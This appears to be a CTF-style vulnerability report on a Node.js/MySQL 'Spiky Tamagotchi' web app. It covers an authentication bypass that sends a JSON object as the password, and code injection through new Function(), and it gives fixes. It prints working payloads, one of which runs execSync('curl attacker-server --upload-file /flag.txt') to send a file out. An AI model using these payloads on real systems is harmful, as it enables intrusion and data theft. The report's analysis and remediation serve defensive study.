\# Vulnerability Report

\#\# Context

The vulnerable program is a Node.js web application called \*\*Spiky Tamagotchi\*\*, designed as an interactive web interface where users can log in and interact with a virtual “Tamagotchi” style creature by triggering actions such as feeding, playing, or sleeping.

The application runs as a \*\*Node.js userspace web server\*\* with a \*\*MySQL database backend\*\*. The server exposes HTTP endpoints that accept JSON requests and interact with backend helper functions to compute and return updated state values for the Tamagotchi.

\#\#\# Environment

\- Platform: Linux userspace  
\- Application framework: Node.js (Express-style routing)  
\- Database: MySQL accessed through the \`mysql\` NPM module  
\- Authentication mechanism: Username/password authentication with a JWT session cookie  
\- Network exposure: HTTP server accepting requests from a web browser

\#\#\# Application Functionality

The application exposes a login interface at the root path \`/\`. This interface allows users to submit credentials via a POST request to \`/api/login\`.

Relevant route implementation:

\`\`\`javascript  
router.post('/api/login', async (req, res) \=\> {  
const { username, password } \= req.body;  
if (username && password) {  
return db.loginUser(username, password)  
.then(user \=\> {  
let token \= JWTHelper.sign({ username: user\[0\].username });  
res.cookie('session', token, { maxAge: 3600000 });  
return res.send(response('User authenticated successfully\!'));  
})  
.catch(() \=\> res.status(403).send(response('Invalid username or password\!')));  
}  
return res.status(500).send(response('Missing required parameters\!'));  
});  
\`\`\`

Authentication logic is implemented in the \`Database.loginUser()\` function in \`challenge/database.js\`.

\`\`\`javascript  
async loginUser(user, pass) {  
let stmt \= 'SELECT username FROM users WHERE username \= ? AND password \= ?';  
this.connection.query(stmt, \[user, pass\], (err, result) \=\> {  
...  
});  
}  
\`\`\`

The database initialization script creates a single user account:

\- Username: \`admin\`  
\- Password: randomly generated at runtime

Because the password is random, direct credential guessing is not intended to be feasible.

After successful authentication, a \*\*JWT token is issued as a cookie\*\*, granting access to additional endpoints such as \`/interface\` and \`/api/activity\`.

These authenticated endpoints accept numeric parameters representing the creature’s state (health, weight, happiness) and an activity type (\`feed\`, \`play\`, \`sleep\`). The backend calculates new values using the \`SpikyFactor.calculate()\` helper function.

User input reaches the server through HTTP POST requests containing JSON bodies.

\---

\# Vulnerability

Two independent vulnerabilities exist in the application:

1\. Authentication bypass via object injection in the MySQL query interface  
2\. Remote code execution (RCE) via unsanitized code injection in a dynamically generated JavaScript function

\---

\#\# Vulnerability 1: Authentication Bypass via Object Injection

\#\#\# Classification

\- CWE-943: Improper Neutralization of Special Elements in Data Query Logic  
\- CWE-89: SQL Injection (variant via object type injection)

\#\#\# Location

\`challenge/database.js\`

\`\`\`javascript  
async loginUser(user, pass) {  
let stmt \= 'SELECT username FROM users WHERE username \= ? AND password \= ?';  
this.connection.query(stmt, \[user, pass\], (err, result) \=\> {  
...  
});  
}  
\`\`\`

\#\#\# Root Cause

The application uses the \`mysqljs/mysql\` library to execute parameterized queries. However, the query parameters are passed directly from user input without validating their type.

Normally, placeholders (\`?\`) are escaped safely when \*\*strings\*\* are passed as parameters. However, the mysql library contains an edge case where \*\*objects passed as parameters are interpreted differently by the escaping function\*\*, allowing attackers to manipulate the query logic.

Because the login endpoint accepts arbitrary JSON, an attacker can send a \*\*JSON object instead of a string\*\* for the password parameter.

\#\#\# Triggering Input

A malicious login request:

\`\`\`  
POST /api/login HTTP/1.1  
Content-Type: application/json

{  
"username": "admin",  
"password": {"password": 1}  
}  
\`\`\`

Instead of being treated as a literal value, the object causes the query escaping logic to behave unexpectedly, allowing the query condition to succeed and bypass password verification.

The server then incorrectly returns a successful authentication response and issues a valid session cookie.

\---

\#\# Vulnerability 2: Code Injection Leading to Remote Code Execution

\#\#\# Classification

\- CWE-94: Improper Control of Code Generation  
\- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code

\#\#\# Location

\`challenge/helpers/SpikyFactor.js\`

The vulnerable code dynamically generates JavaScript using string concatenation and executes it with the \`Function\` constructor:

\`\`\`javascript  
let res \= \`with(a='${activity}', hp=${health}, w=${weight},  
hs=${happiness}) { ... }\`;

quickMaths \= new Function(res);  
const {m, hp, w, hs} \= quickMaths();  
\`\`\`

\#\#\# Root Cause

The \`activity\` parameter originates from user input and is \*\*embedded directly into a JavaScript code string without sanitization\*\*.

Because the string is executed using \`new Function()\`, attackers can inject arbitrary JavaScript code.

\#\#\# Triggering Input

An attacker can break out of the expected string context by injecting additional code into the \`activity\` field.

Example malicious payload:

\`\`\`  
sleep'+process.mainModule.require('child\_process')  
.execSync('curl attacker-server')+'  
\`\`\`

This modifies the dynamically generated function so that Node.js executes a system command.

\---

\# Exploitation

The attack chain involves two stages:

1\. Authentication bypass  
2\. Remote code execution

\---

\#\# Stage 1: Authentication Bypass

The attacker first sends a crafted login request containing a JSON object in the password field.

Because the mysql query escape mechanism mishandles object parameters, the password check succeeds even without the correct password.

The server therefore returns a valid JWT session cookie, granting access to authenticated endpoints such as \`/interface\` and \`/api/activity\`.

\---

\#\# Stage 2: Remote Code Execution

After authentication, the attacker interacts with the Tamagotchi interface. The frontend sends POST requests to \`/api/activity\`.

Example request body:

\`\`\`  
{  
"activity": "feed",  
"health": 60,  
"weight": 42,  
"happiness": 50  
}  
\`\`\`

These values are passed to the vulnerable \`SpikyFactor.calculate()\` function.

Because the \`activity\` field is embedded inside dynamically generated JavaScript without sanitization, the attacker can inject arbitrary JavaScript code.

The injected code can leverage Node.js internals to execute system commands:

\`\`\`javascript  
process.mainModule.require('child\_process').execSync(...)  
\`\`\`

Example malicious request:

\`\`\`  
{  
"activity": "sleep'+process.mainModule.require('child\_process').execSync('curl attacker-server \--upload-file /flag.txt')+'",  
"health": 60,  
"weight": 42,  
"happiness": 50  
}  
\`\`\`

This payload causes the server to execute a shell command and send the contents of \`/flag.txt\` to an attacker-controlled server.

At this point, the attacker has achieved \*\*remote command execution within the Node.js process environment\*\*.

\---

\# Remediation

Multiple fixes should be implemented to eliminate the vulnerabilities.

\---

\#\# Fix for Authentication Bypass

\#\#\# Input Validation

Ensure \`username\` and \`password\` are strings before executing the query.

\`\`\`javascript  
if (typeof username \!== "string" || typeof password \!== "string") {  
return res.status(400).send("Invalid input type");  
}  
\`\`\`

\#\#\# Enforce Query Parameter Types

Use a query builder or ORM that rejects non-string parameters.

\#\#\# JSON Schema Validation

Validate request bodies with schema validation libraries such as:

\- Joi  
\- Zod  
\- Ajv

These libraries prevent object injection attacks.

\---

\#\# Fix for Code Injection

\#\#\# Remove Dynamic Code Generation

The use of \`new Function()\` should be removed entirely.

Instead, implement the logic with standard JavaScript:

\`\`\`javascript  
if (activity \=== "feed") {  
hp \+= 1;  
w \+= 5;  
hs \+= 3;  
}  
\`\`\`

\#\#\# Restrict Allowed Values

Validate the \`activity\` field against an allowlist:

\`\`\`javascript  
const allowed \= \["feed", "play", "sleep"\];  
if (\!allowed.includes(activity)) {  
throw new Error("Invalid activity");  
}  
\`\`\`

\#\#\# Avoid Executing User-Controlled Code

Never concatenate user input into executable code.

\---

\#\# Defense in Depth

Additional security improvements include:

\- Implement Content Security Policies  
\- Restrict outbound network connections  
\- Run the Node.js service in a sandboxed container  
\- Use least-privilege database accounts  
\- Enable runtime monitoring or intrusion detection

\---

\#\# Variant Analysis

Similar vulnerabilities could be discovered through:

\#\#\# Static Analysis

Tools can detect usage of:

\- \`new Function()\`  
\- \`eval()\`  
\- dynamic code generation patterns

\#\#\# Dependency Scanning

Security scanners can detect vulnerable versions of the \`mysqljs/mysql\` package.

\#\#\# Fuzzing

Automated fuzzing of HTTP endpoints with unexpected data types (objects instead of strings) can reveal injection vulnerabilities.
